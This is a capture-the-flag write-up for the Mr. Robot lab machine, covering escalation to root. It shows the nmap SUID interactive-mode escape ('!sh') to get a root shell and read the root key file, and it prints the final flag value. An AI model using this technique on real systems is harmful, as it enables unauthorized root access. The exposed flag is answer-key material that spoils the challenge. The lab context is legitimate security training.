
# Privilege Escalation and Root Access

## 1. Gaining Root Access

After obtaining access as the **robot** user and retrieving the second key, the final step is to escalate privileges to root and access the last key.

### Methods for Privilege Escalation:

- **SUID Binaries Exploitation**
- **Cron Jobs Exploitation**

For this case, we will use **SUID binaries**.

### Exploiting Nmap for Root Access

1. Check if **nmap** has the SUID bit set:
    
    ```bash
    /usr/local/bin/nmap --interactive
    ```
    
    If nmap runs in interactive mode, it is vulnerable.
2. Enter the following command to gain a root shell:
    
    ```bash
    !sh
    ```
    
    This successfully escalates privileges to root.

![[key3_photo1.png]]

### Retrieving the Final Key

Once root access is obtained, retrieve the last key by running:

```bash
cat /root/key-3-of-3.txt
```

**Key 3:** `04787ddef27c3dee1ee161b21670b4e4`

![[key3_photo2.png]]
## 2. Alternative Direct Root Exploit

An alternative method exists that allows direct root access from the **daemon** user, skipping the need to switch to **robot**.

### Steps:

1. From the **daemon** user, run:
    
    ```bash
    /usr/local/bin/nmap --interactive
    ```
    
2. Execute:
    
    ```bash
    !sh
    ```
    
    This immediately grants root access.
3. Retrieve the root key:
    
    ```bash
    cat /root/key-3-of-3.txt
    ```
    

---

## Conclusion

This completes the **Mr. Robot CTF** by successfully:

- Exploiting **nmap SUID** for root access.
- Retrieving the final key to complete the challenge.



